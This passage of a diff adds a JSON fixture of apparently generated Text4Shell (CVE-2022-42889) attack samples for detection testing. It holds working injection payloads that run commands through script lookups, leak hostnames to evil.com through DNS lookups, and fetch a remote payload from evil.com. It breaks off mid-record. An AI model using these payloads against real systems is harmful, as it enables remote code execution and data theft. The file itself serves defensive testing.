@@ -1,0 +1,1002 @@
+[
+  {
+    "id": "text4shell_0000",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "123.42.2.253",
+    "timestamp": "2026-03-13T21:53:09.060966"
+  },
+  {
+    "id": "text4shell_0001",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "86.7.164.213",
+    "timestamp": "2026-03-13T21:53:09.060974"
+  },
+  {
+    "id": "text4shell_0002",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "110.103.63.210",
+    "timestamp": "2026-03-13T21:53:09.060980"
+  },
+  {
+    "id": "text4shell_0003",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "175.116.166.71",
+    "timestamp": "2026-03-13T21:53:09.060985"
+  },
+  {
+    "id": "text4shell_0004",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "210.18.76.122",
+    "timestamp": "2026-03-13T21:53:09.060990"
+  },
+  {
+    "id": "text4shell_0005",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.244.193.32",
+    "timestamp": "2026-03-13T21:53:09.060995"
+  },
+  {
+    "id": "text4shell_0006",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "203.255.136.88",
+    "timestamp": "2026-03-13T21:53:09.061000"
+  },
+  {
+    "id": "text4shell_0007",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "8.19.63.227",
+    "timestamp": "2026-03-13T21:53:09.061006"
+  },
+  {
+    "id": "text4shell_0008",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "24.252.29.129",
+    "timestamp": "2026-03-13T21:53:09.061011"
+  },
+  {
+    "id": "text4shell_0009",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "45.173.54.103",
+    "timestamp": "2026-03-13T21:53:09.061015"
+  },
+  {
+    "id": "text4shell_0010",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "151.168.204.145",
+    "timestamp": "2026-03-13T21:53:09.061020"
+  },
+  {
+    "id": "text4shell_0011",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "208.124.35.174",
+    "timestamp": "2026-03-13T21:53:09.061025"
+  },
+  {
+    "id": "text4shell_0012",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "215.164.24.174",
+    "timestamp": "2026-03-13T21:53:09.061029"
+  },
+  {
+    "id": "text4shell_0013",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "120.131.215.35",
+    "timestamp": "2026-03-13T21:53:09.061034"
+  },
+  {
+    "id": "text4shell_0014",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "16.127.77.234",
+    "timestamp": "2026-03-13T21:53:09.061038"
+  },
+  {
+    "id": "text4shell_0015",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "141.253.97.43",
+    "timestamp": "2026-03-13T21:53:09.061043"
+  },
+  {
+    "id": "text4shell_0016",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "111.155.24.249",
+    "timestamp": "2026-03-13T21:53:09.061050"
+  },
+  {
+    "id": "text4shell_0017",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "10.70.80.195",
+    "timestamp": "2026-03-13T21:53:09.061054"
+  },
+  {
+    "id": "text4shell_0018",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "178.50.97.250",
+    "timestamp": "2026-03-13T21:53:09.061059"
+  },
+  {
+    "id": "text4shell_0019",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "131.167.218.95",
+    "timestamp": "2026-03-13T21:53:09.061063"
+  },
+  {
+    "id": "text4shell_0020",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "46.19.92.189",
+    "timestamp": "2026-03-13T21:53:09.061074"
+  },
+  {
+    "id": "text4shell_0021",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "130.102.49.107",
+    "timestamp": "2026-03-13T21:53:09.061078"
+  },
+  {
+    "id": "text4shell_0022",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "168.153.123.92",
+    "timestamp": "2026-03-13T21:53:09.061083"
+  },
+  {
+    "id": "text4shell_0023",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "126.182.248.129",
+    "timestamp": "2026-03-13T21:53:09.061088"
+  },
+  {
+    "id": "text4shell_0024",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "190.209.13.58",
+    "timestamp": "2026-03-13T21:53:09.061092"
+  },
+  {
+    "id": "text4shell_0025",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "213.241.179.239",
+    "timestamp": "2026-03-13T21:53:09.061096"
+  },
+  {
+    "id": "text4shell_0026",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "18.102.85.195",
+    "timestamp": "2026-03-13T21:53:09.061101"
+  },
+  {
+    "id": "text4shell_0027",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "100.101.67.65",
+    "timestamp": "2026-03-13T21:53:09.061106"
+  },
+  {
+    "id": "text4shell_0028",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "198.179.3.54",
+    "timestamp": "2026-03-13T21:53:09.061110"
+  },
+  {
+    "id": "text4shell_0029",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "106.111.96.39",
+    "timestamp": "2026-03-13T21:53:09.061115"
+  },
+  {
+    "id": "text4shell_0030",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "138.56.125.142",
+    "timestamp": "2026-03-13T21:53:09.061119"
+  },
+  {
+    "id": "text4shell_0031",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "151.2.111.166",
+    "timestamp": "2026-03-13T21:53:09.061124"
+  },
+  {
+    "id": "text4shell_0032",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "176.157.58.197",
+    "timestamp": "2026-03-13T21:53:09.061128"
+  },
+  {
+    "id": "text4shell_0033",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "215.231.246.113",
+    "timestamp": "2026-03-13T21:53:09.061133"
+  },
+  {
+    "id": "text4shell_0034",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "191.212.211.202",
+    "timestamp": "2026-03-13T21:53:09.061137"
+  },
+  {
+    "id": "text4shell_0035",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "160.196.163.33",
+    "timestamp": "2026-03-13T21:53:09.061142"
+  },
+  {
+    "id": "text4shell_0036",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "131.45.6.54",
+    "timestamp": "2026-03-13T21:53:09.061146"
+  },
+  {
+    "id": "text4shell_0037",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "160.43.194.172",
+    "timestamp": "2026-03-13T21:53:09.061151"
+  },
+  {
+    "id": "text4shell_0038",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "189.14.86.186",
+    "timestamp": "2026-03-13T21:53:09.061158"
+  },
+  {
+    "id": "text4shell_0039",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "223.170.244.92",
+    "timestamp": "2026-03-13T21:53:09.061163"
+  },
+  {
+    "id": "text4shell_0040",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "191.199.109.209",
+    "timestamp": "2026-03-13T21:53:09.061169"
+  },
+  {
+    "id": "text4shell_0041",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "16.124.40.15",
+    "timestamp": "2026-03-13T21:53:09.061174"
+  },
+  {
+    "id": "text4shell_0042",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "101.227.119.53",
+    "timestamp": "2026-03-13T21:53:09.061179"
+  },
+  {
+    "id": "text4shell_0043",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "103.245.240.150",
+    "timestamp": "2026-03-13T21:53:09.061183"
+  },
+  {
+    "id": "text4shell_0044",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "139.237.43.104",
+    "timestamp": "2026-03-13T21:53:09.061188"
+  },
+  {
+    "id": "text4shell_0045",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "54.147.132.189",
+    "timestamp": "2026-03-13T21:53:09.061192"
+  },
+  {
+    "id": "text4shell_0046",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "108.244.124.121",
+    "timestamp": "2026-03-13T21:53:09.061198"
+  },
+  {
+    "id": "text4shell_0047",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "40.42.252.37",
+    "timestamp": "2026-03-13T21:53:09.061202"
+  },
+  {
+    "id": "text4shell_0048",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "109.57.221.106",
+    "timestamp": "2026-03-13T21:53:09.061207"
+  },
+  {
+    "id": "text4shell_0049",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "39.142.241.253",
+    "timestamp": "2026-03-13T21:53:09.061212"
+  },
+  {
+    "id": "text4shell_0050",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "32.96.193.73",
+    "timestamp": "2026-03-13T21:53:09.061218"
+  },
+  {
+    "id": "text4shell_0051",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "45.25.221.187",
+    "timestamp": "2026-03-13T21:53:09.061223"
+  },
+  {
+    "id": "text4shell_0052",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "66.185.216.3",
+    "timestamp": "2026-03-13T21:53:09.061227"
+  },
+  {
+    "id": "text4shell_0053",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.104.74.41",
+    "timestamp": "2026-03-13T21:53:09.061232"
+  },
+  {
+    "id": "text4shell_0054",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "208.26.238.68",
+    "timestamp": "2026-03-13T21:53:09.061237"
+  },
+  {
+    "id": "text4shell_0055",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "91.165.185.115",
+    "timestamp": "2026-03-13T21:53:09.061241"
+  },
+  {
+    "id": "text4shell_0056",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "177.107.226.103",
+    "timestamp": "2026-03-13T21:53:09.061245"
+  },
+  {
+    "id": "text4shell_0057",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "223.64.133.148",
+    "timestamp": "2026-03-13T21:53:09.061250"
+  },
+  {
+    "id": "text4shell_0058",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "194.70.160.16",
+    "timestamp": "2026-03-13T21:53:09.061254"
+  },
+  {
+    "id": "text4shell_0059",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "186.35.150.74",
+    "timestamp": "2026-03-13T21:53:09.061263"
+  },
+  {
+    "id": "text4shell_0060",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.136.207.203",
+    "timestamp": "2026-03-13T21:53:09.061268"
+  },
+  {
+    "id": "text4shell_0061",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "146.195.242.21",
+    "timestamp": "2026-03-13T21:53:09.061272"
+  },
+  {
+    "id": "text4shell_0062",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "107.89.186.76",
+    "timestamp": "2026-03-13T21:53:09.061277"
+  },
+  {
+    "id": "text4shell_0063",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "157.130.144.143",
+    "timestamp": "2026-03-13T21:53:09.061281"
+  },
+  {
+    "id": "text4shell_0064",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "188.231.56.160",
+    "timestamp": "2026-03-13T21:53:09.061286"
+  },
+  {
+    "id": "text4shell_0065",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "74.167.154.120",
+    "timestamp": "2026-03-13T21:53:09.061291"
+  },
+  {
+    "id": "text4shell_0066",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "34.205.23.231",
+    "timestamp": "2026-03-13T21:53:09.061295"
+  },
+  {
+    "id": "text4shell_0067",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "179.240.138.32",
+    "timestamp": "2026-03-13T21:53:09.061300"
+  },
+  {
+    "id": "text4shell_0068",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "89.97.136.221",
+    "timestamp": "2026-03-13T21:53:09.061304"
+  },
+  {
+    "id": "text4shell_0069",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "172.152.22.156",
+    "timestamp": "2026-03-13T21:53:09.061309"
+  },
+  {
+    "id": "text4shell_0070",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "20.48.204.66",
+    "timestamp": "2026-03-13T21:53:09.061314"
+  },
+  {
+    "id": "text4shell_0071",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "89.164.231.162",
+    "timestamp": "2026-03-13T21:53:09.061318"
+  },
+  {
+    "id": "text4shell_0072",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "113.230.149.4",
+    "timestamp": "2026-03-13T21:53:09.061323"
+  },
+  {
+    "id": "text4shell_0073",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:js:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "37.60.91.210",
+    "timestamp": "2026-03-13T21:53:09.061327"
+  },
+  {
+    "id": "text4shell_0074",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "10.119.236.196",
+    "timestamp": "2026-03-13T21:53:09.061332"
+  },
+  {
+    "id": "text4shell_0075",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "219.196.7.82",
+    "timestamp": "2026-03-13T21:53:09.061336"
+  },
+  {
+    "id": "text4shell_0076",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.136.137.92",
+    "timestamp": "2026-03-13T21:53:09.061341"
+  },
+  {
+    "id": "text4shell_0077",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "26.114.71.28",
+    "timestamp": "2026-03-13T21:53:09.061345"
+  },
+  {
+    "id": "text4shell_0078",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "208.46.45.129",
+    "timestamp": "2026-03-13T21:53:09.061350"
+  },
+  {
+    "id": "text4shell_0079",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "184.103.254.152",
+    "timestamp": "2026-03-13T21:53:09.061357"
+  },
+  {
+    "id": "text4shell_0080",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "90.205.64.28",
+    "timestamp": "2026-03-13T21:53:09.061364"
+  },
+  {
+    "id": "text4shell_0081",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.195.213.73",
+    "timestamp": "2026-03-13T21:53:09.061369"
+  },
+  {
+    "id": "text4shell_0082",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "176.250.185.3",
+    "timestamp": "2026-03-13T21:53:09.061373"
+  },
+  {
+    "id": "text4shell_0083",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "137.100.245.141",
+    "timestamp": "2026-03-13T21:53:09.061378"
+  },
+  {
+    "id": "text4shell_0084",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "36.2.142.52",
+    "timestamp": "2026-03-13T21:53:09.061382"
+  },
+  {
+    "id": "text4shell_0085",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "85.132.234.140",
+    "timestamp": "2026-03-13T21:53:09.061387"
+  },
+  {
+    "id": "text4shell_0086",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "42.146.193.53",
+    "timestamp": "2026-03-13T21:53:09.061391"
+  },
+  {
+    "id": "text4shell_0087",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:groovy:Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "151.191.81.36",
+    "timestamp": "2026-03-13T21:53:09.061396"
+  },
+  {
+    "id": "text4shell_0088",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "92.190.123.50",
+    "timestamp": "2026-03-13T21:53:09.061400"
+  },
+  {
+    "id": "text4shell_0089",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "3.168.228.225",
+    "timestamp": "2026-03-13T21:53:09.061405"
+  },
+  {
+    "id": "text4shell_0090",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "213.189.16.201",
+    "timestamp": "2026-03-13T21:53:09.061410"
+  },
+  {
+    "id": "text4shell_0091",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "201.168.147.72",
+    "timestamp": "2026-03-13T21:53:09.061414"
+  },
+  {
+    "id": "text4shell_0092",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "154.136.191.227",
+    "timestamp": "2026-03-13T21:53:09.061419"
+  },
+  {
+    "id": "text4shell_0093",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "30.251.91.189",
+    "timestamp": "2026-03-13T21:53:09.061424"
+  },
+  {
+    "id": "text4shell_0094",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "87.23.103.59",
+    "timestamp": "2026-03-13T21:53:09.061428"
+  },
+  {
+    "id": "text4shell_0095",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:python:import os; os.system('id')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "178.193.131.140",
+    "timestamp": "2026-03-13T21:53:09.061433"
+  },
+  {
+    "id": "text4shell_0096",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${dns:${hostName}.evil.com}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "172.139.72.117",
+    "timestamp": "2026-03-13T21:53:09.061437"
+  },
+  {
+    "id": "text4shell_0097",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
